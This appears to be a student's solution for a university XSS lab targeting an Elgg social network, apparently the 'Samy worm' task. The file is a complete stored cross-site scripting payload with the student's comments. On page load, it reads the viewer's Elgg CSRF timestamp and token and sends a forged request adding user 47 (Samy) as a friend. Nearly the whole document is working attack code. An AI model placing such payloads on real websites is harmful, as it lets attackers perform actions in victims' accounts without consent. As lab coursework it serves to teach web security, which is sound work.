//task1

<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	// I sent friend request to samy from other users.In each request url, I observed friend=47 is fixed for samy.It changes if and only if,
	// i sent request to another user. then there are ts and token.So,i set up the url like this

	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN

	//Create and send Ajax request to add friend

	// I observed that in the skeleton code, we find ts and token from a get request http://www.xsslabelgg.com/profile/samy. There I found 		// that elgg.session.user.guid is the user id

	if(elgg.session.user.guid!=47){
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	}
</script>

